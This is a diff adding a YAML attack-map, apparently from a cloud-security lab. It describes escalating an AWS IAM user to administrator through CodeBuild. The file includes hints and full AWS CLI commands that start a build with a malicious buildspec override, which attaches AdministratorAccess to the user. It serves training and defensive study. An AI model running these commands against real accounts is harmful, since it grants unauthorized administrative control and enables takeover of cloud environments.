@@ -1,0 +1,80 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-codebuild-002-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has codebuild:StartBuild permission (along with helpful permissions
+        codebuild:ListProjects, codebuild:BatchGetProjects, and codebuild:BatchGetBuilds),
+        but notably does NOT have iam:PassRole or codebuild:CreateProject. Look for
+        existing CodeBuild projects that have privileged service roles attached.
+
+    - id: codebuild-project
+      label: "Existing CodeBuild Project"
+      type: resource
+      subType: codebuild-project
+      arn: "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-002-to-admin-existing-project"
+      description: >
+        This pre-existing CodeBuild project has a privileged service role attached. By
+        starting a build with a buildspec override, you can execute arbitrary commands
+        under the project's service role without needing iam:PassRole or
+        codebuild:CreateProject permissions.
+
+    - id: project-role
+      label: "Privileged Project Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-codebuild-002-to-admin-project-role"
+      description: >
+        This IAM role is attached to the CodeBuild project as its service role. It has
+        AdministratorAccess, meaning any build running under this project can perform any
+        AWS action — including attaching managed policies to IAM users. The malicious
+        buildspec executes under this role's permissions, attaching AdministratorAccess
+        directly to the starting user and completing the privilege escalation.
+
+  edges:
+    - from: starting-principal
+      to: codebuild-project
+      label: "codebuild:StartBuild"
+      description: >
+        Trigger a build on the existing project using --buildspec-override to supply
+        a malicious buildspec that attaches AdministratorAccess to the starting user.
+      hints:
+        - "You can trigger builds on existing CodeBuild projects."
+        - "Look for CodeBuild projects whose service roles have IAM modification permissions."
+        - "Check what IAM role this project uses as its service role — use codebuild:BatchGetProjects to inspect the serviceRole field."
+        - "The --buildspec-override parameter lets you replace a project's build instructions without modifying the project itself."
+        - "Browse to https://pathfinding.cloud/paths/codebuild-002 for technique details."
+      commands:
+        - description: "List existing CodeBuild projects"
+          command: "aws codebuild list-projects"
+        - description: "Inspect the project's service role"
+          command: "aws codebuild batch-get-projects --names pl-prod-codebuild-002-to-admin-existing-project --query 'projects[0].serviceRole'"
+        - description: "Start a build with a malicious buildspec override"
+          command: |
+            aws codebuild start-build \
+              --project-name pl-prod-codebuild-002-to-admin-existing-project \
+              --buildspec-override 'version: 0.2\nphases:\n  build:\n    commands:\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-002-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
+        - description: "Wait for the build to complete"
+          command: "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus'"
+
+    - from: codebuild-project
+      to: project-role
+      label: "iam:AttachUserPolicy"
+      description: >
+        The CodeBuild project executes the override buildspec using its attached service
+        role. The malicious buildspec uses the project role's IAM permissions to attach
+        AdministratorAccess directly to the starting user, completing the escalation.
+      commands:
+        - description: "Verify administrator access with original credentials"
+          command: "aws iam list-users --max-items 1"
